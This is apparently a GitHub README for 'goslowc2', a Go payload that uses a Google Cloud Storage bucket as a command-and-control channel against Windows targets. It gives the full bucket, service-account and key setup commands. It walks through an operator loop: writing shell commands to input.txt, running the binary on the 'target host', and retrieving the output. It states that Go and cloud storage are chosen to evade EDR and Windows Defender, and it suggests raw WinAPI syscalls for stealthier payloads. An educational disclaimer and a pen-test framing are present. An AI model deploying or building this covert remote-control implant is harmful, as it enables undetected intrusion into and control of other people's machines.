# goslowc2
A demonstration of using GoLang and GCP Storage for a quick and easy evasion payload.

### Why?
1. Found GoLang is not as widely supported for reverse engineering tools without plugins or some tuning which also infers that EDR platforms haven't caught up as much either
2. GoLang allows the advantage of scripting language but the performance of a compiled language because you can 'go build foo.go' something
3. Google Cloud Platform (GCP) Storage SDK automatically allows for authentication TLS v1.2 secure endpoints and a scratch pad for input and output for easy asynchronous communication
4. Running GoLang os.exec and the syscall.call methods to unsafe (non type casted) unsigned integer pointers C style for interesting Windows 10/11 Q4 2022 Defender default 'evasion' shell or additional payload routines vs. the C running the system method that immediately triggers a backdoor alert and cloud scan
5. General grudge: Google SOC sent me a nasty gram about my C payload stored in my personal Google Drive account. GoLang was may by Google Developers. I wanted to make it ironic because this would have been so much easier using a packer + python3.
6. Maybe you don't have access to the standard MSF multi/handler in a pen test?

### Complementing gowrap module
This module is to demonstrate using os.exec to wrap and execute another Go script or binary as a subprocess which easily can trigger an IOC but also allows for easy ingestion (with some modification) of running input.txt with straight GoLang WinAPI sys calls for future "evasion" considerations. I also included notes about some strange behaviors found when using user32.dll MessageBoxA.


## Code Setup
go mod init goslowc2/main
go get cloud.google.com/storage
go build goslowc2

## GCP Storage bucket setup

    gsutil mb gs://BUCKET_NAME
    
    gcloud iam service-accounts create SA_NAME \
        --description="DESCRIPTION" \
        --display-name="DISPLAY_NAME"
    
    gcloud projects add-iam-policy-binding PROJECT_ID \
        --member="serviceAccount:SA_NAME@PROJECT_ID.iam.gserviceaccount.com" \
        --role="ROLE_NAME"
    
For CLI need to create YAML for the permissions to bind to a role

    title: goslow-role  
    description: foo  
    stage: GA  
    includedPermissions:  
    -  storage.objects.create  
    -  storage.objects.get   

Create the role at the project level

    gcloud iam roles create role-id --project=project-id \
        --file=yaml-file-path

Bind the role to the service account

    gcloud iam service-accounts add-iam-policy-binding \  SA_NAME@PROJECT_ID.iam.gserviceaccount.com \  --member="user:USER_EMAIL"  \  --role="roles/iam.serviceAccountUser"

Grab a JSON key to download and run in the same directory as goslowc2

    gcloud iam service-accounts keys create KEY_FILE \
        --iam-account=SA_NAME@PROJECT_ID.iam.gserviceaccount.com

## Using the C2 Channel
1. Create a input.txt in the root namespace of your **bucket** with a single command syntax such as "whoami" or "dir"
2. Run goslowc2.exe on targethost
3. Wait for the output.txt to show up in your bucket in the same root namespace
4. gsutil cp gs://YOURBUCKET/*.txt ./
5. cat ./output.txt
6. echo "whoami" > input.txt
7. gsutil cp ./input.txt gs://YOURBUCKET


## Runtime
**IMPORTANT**: Be sure to modify any variables in the code before building as the initial values are for demo purposes only

    cp <yourserviceaccountkey.json> ./
    go build goslowc2.go
    goslowc2.exe #this is going to be your payload running on target host

![enter image description here](https://github.com/dc401/goslowc2/blob/main/screenshots/runtime2.png?raw=true)

![enter image description here](https://github.com/dc401/goslowc2/blob/main/screenshots/runtime1.png?raw=true)

## Notes
**DISCLAIMER**: The author is NOT responsible for misuse or abuse of this educational source
// goslowc2 is a demo payload execution for using GCP Storage bucket and objects as the C2 mechanism the time of development Q4 2022 windows defender did not trigger the OS.exec method unless functions were stripped at build time

// For stealthier payload consider using my complement consider using direct WinAPI syscalls converting to unsigned integer pointers

// Author: Dennis Chow dchow[AT]xtecsystems.com 11/20/2022

// Requirements: GCP storage bucket and service account credential foo.json in the same runtime directory

// Confirmed working on GoLang 1.18.4 and GCP Storage SDK 1.28.0
